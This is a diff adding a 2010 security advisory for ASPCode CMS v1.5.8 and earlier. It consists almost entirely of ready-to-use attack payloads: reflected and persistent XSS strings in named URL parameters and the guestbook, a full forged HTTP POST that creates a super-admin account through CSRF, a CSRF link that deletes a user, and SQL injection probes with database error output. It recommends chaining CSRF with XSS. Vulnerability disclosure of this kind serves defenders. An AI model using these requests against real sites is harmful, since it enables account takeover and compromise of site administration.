@@ -1,0 +1,79 @@
+#
+#
+# Multiple Vulnerability in ASPCode CMS
+#
+# [Software Version]: <= v1.5.8
+# [Vendor WebSite]: www.aspcodecms.com 
+# [Date]: 01 January 2010
+# 
+# Found by Alberto "fulgur" Fontanella
+# 
+# itsicurezza<0x40>yahoo.it - ictsec.wordpress.com
+#
+#
+
+
+[1] - [Multiple XSS Vulnerability]
+
+   http://[host]/default.asp?sec=1&ma1="><script>alert("XSS");</script>
+
+   http://[host]/default.asp?sec=1&tag="><script>alert("XSS");</script>
+
+   http://[host]/default.asp?sec=1&ma2="><script>alert("XSS");</script>
+
+   XSS found also on Form to reset password: http://[host]/default.asp?sec=33&ma1=forgotpass
+   
+   Put XSS String in Email Field and Submit it
+
+
+[2] - [Persistent XSS]
+
+   Post in Guestbook Section: http://[host]/default.asp?sec=23
+
+   <img src="http://[host]/default.asp?sec=1&ma1="><script>alert("XSS");</script>"></img>
+
+
+[3] - [CSRF]
+
+   To Delete an User Account
+
+   http://[host]/default.asp?a1=admin&a2=modules&a3=manage&module=users&ma1=users&ma2=delete&idx=50
+
+   To Create a Super Admin Account
+
+   POST /default.asp?a1=admin&a2=modules&a3=manage&module=users&ma1=users&ma2=update&idx=-1
+   HTTP/1.1
+   Host: [host]
+   User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.15)
+   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+   Accept-Language: en-us,en;q=0.5
+   Accept-Encoding: gzip,deflate
+   Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+   Keep-Alive: 300
+   Connection: keep-alive
+   Referer: http://[host]/default.asp?a1=admin&a2=modules&a3=manage&module=users&ma1=users&ma2=edit&idx=-1
+   Content-Type: application/x-www-form-urlencoded
+   Content-Length: 140
+
+   username=HAXOR&password=PASSWD&old_password=&password_is_encrypted=false&email=HAXOR%40BLACKHAT.ORG&roleId=4&redirsectionid=0&confirmed=true
+   
+   You can use CSRF + XSS (Very Dangerous)
+
+
+[4] - [Possible SQL Injection]
+
+   http://[host]/default.asp?sec=64&ma1=tag&tag=CMS'
+
+   Errore numero: -2147217900
+   Errore: Errore di sintassi (operatore mancante) nell'espressione della query
+   '[ID] IN ()'.
+
+   Query:
+   SELECT * FROM [section] s WHERE [ID] IN ()
+
+
+   http://[host]/default.asp=sec=1'
+
+   Errore di run-time di Microsoft VBScript (0x800A000D)
+   Tipo non corrispondente: 'sectionID'
+   /include/api.asp, line 657
